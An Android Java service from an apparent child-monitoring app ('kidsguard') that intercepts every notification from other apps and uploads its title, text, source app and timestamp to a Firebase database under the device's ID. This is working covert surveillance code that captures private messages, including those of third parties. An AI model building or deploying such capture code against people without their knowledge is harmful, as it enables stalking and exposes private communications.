package com.kidsguard.child;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class NotificationCaptureService extends NotificationListenerService {
    private static final String TAG = "NotifCapture";
    private final ExecutorService io = Executors.newSingleThreadExecutor();
    private String deviceId;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = LocationService.getSafeDeviceId(this);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;

        if (sbn.getPackageName().equals(getPackageName())) return;

        io.execute(() -> {
            try {
                CharSequence titleCs = sbn.getNotification().extras != null ? sbn.getNotification().extras.getCharSequence("android.title") : null;
                CharSequence textCs = sbn.getNotification().extras != null ? sbn.getNotification().extras.getCharSequence("android.text") : null;

                String title = titleCs != null ? titleCs.toString() : "";
                String text = textCs != null ? textCs.toString() : "";

                JSONObject payload = new JSONObject();
                payload.put("app", sbn.getPackageName());
                payload.put("title", title);
                payload.put("text", text);
                payload.put("time", sbn.getPostTime());

                FirebaseHelper.put("devices/" + deviceId + "/notifications.json", payload.toString());
            } catch (Exception e) {
                Log.e(TAG, "Notification parse failed", e);
            }
        });
    }

    @Override
    public void onDestroy() {
        io.shutdownNow();
        super.onDestroy();
    }
}
